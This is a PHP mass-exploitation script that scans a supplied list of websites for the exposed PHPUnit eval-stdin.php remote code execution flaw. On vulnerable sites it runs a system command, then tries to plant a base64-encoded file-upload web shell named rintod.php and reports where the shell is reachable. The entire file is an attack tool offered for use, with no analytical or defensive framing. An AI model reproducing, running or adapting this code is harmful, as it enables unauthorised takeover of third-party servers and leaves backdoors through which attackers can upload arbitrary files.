<?php
// Created By Rintod as Con7ext
define("SHELLCODE", "PD9waHAgDQppZihpc3NldCgkX0ZJTEVTWydyaW50b2QnXVsnbmFtZSddKSl7DQogICRuYW1lID0gJF9GSUxFU1sncmludG9kJ11bJ25hbWUnXTsNCiAgJG50b2QgPSAkX0ZJTEVTWydyaW50b2QnXVsndG1wX25hbWUnXTsNCiAgQG1vdmVfdXBsb2FkZWRfZmlsZSgkbnRvZCwgJG5hbWUpOw0KICBlY2hvICRuYW1lOw0KfWVsc2V7DQogIGVjaG8gIjxmb3JtIG1ldGhvZD1wb3N0IGVuY3R5cGU9bXVsdGlwYXJ0L2Zvcm0tZGF0YT48aW5wdXQgdHlwZT1maWxlIG5hbWU9cmludG9kPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT1VcGxvYWQ+IjsNCn0gDQo/Pg==");
define("SHELL", "rintod.php");
define("PAYLOAD", "/vendor/phpunit/phpunit/src/Util/PHP/");
function req($url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  $c = curl_exec($ch);
  $v = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  return [
    "head" => $v,
    "body" => $c
  ];
}
function exploit($url, $mew){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
  curl_setopt($ch, CURLOPT_POSTFIELDS, $mew);
  $c = curl_exec($ch);
  $v = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  return [
    "head" => $v,
    "body" => $c
  ];
}
@parse_str(implode("&", array_slice($argv, 1)), $_GET);
$list = @$_GET["list"];
$meong = @explode("\n", @file_get_contents($list));
$bl = "\033[0;34m";
$gr = "\033[0;32m";
$re = "\033[0;31m";
echo "${bl}[=] This Tool Created By Con7ext [=]\n";
foreach($meong as $site){
  $mes = '<?php system("ls -la"); ?>';
  $mos = exploit($site.PAYLOAD."eval-stdin.php", $mes);
  if($mos["head"] == 200){
    if(preg_match("/Windows.php|window.php|Template/", $mos["body"])){
      echo "${gr}[+] ${site} -> Vuln\n";
      echo "${gr}Result #\n";
      echo $mos["body"];
      echo "${bl}[!] Uploading Shell...\n";
      exploit($site.PAYLOAD."eval-stdin.php", "<?php system('echo ".SHELLCODE." >> ".SHELL."'); ?>");
      echo "${bl}[!] Checking Shell...\n";
      $mong = req($site.PAYLOAD.SHELL);
      if($mong["head"] == 200){
        echo "${gr}[+] Success Uploading Shell ... ".$site.PAYLOAD.SHELL."\n\n";
      }
      else{
        echo "${re}[-] Failed Uploading Shell ... ERROR CODE: ".$mong["head"]."\n\n";
      }
    }
    else{
      echo "${re}[-] $site -> Not Support With Command Execute {SYSTEM} ... ${bl}[!] You can try with another cmd like POPEN,PROC_OPEN [MANUAL]\n";
    }
  }else{
    echo "${re}[-] ${site} -> 404 / Not Vuln...\n";
  }
}
echo "\033[1;37m";
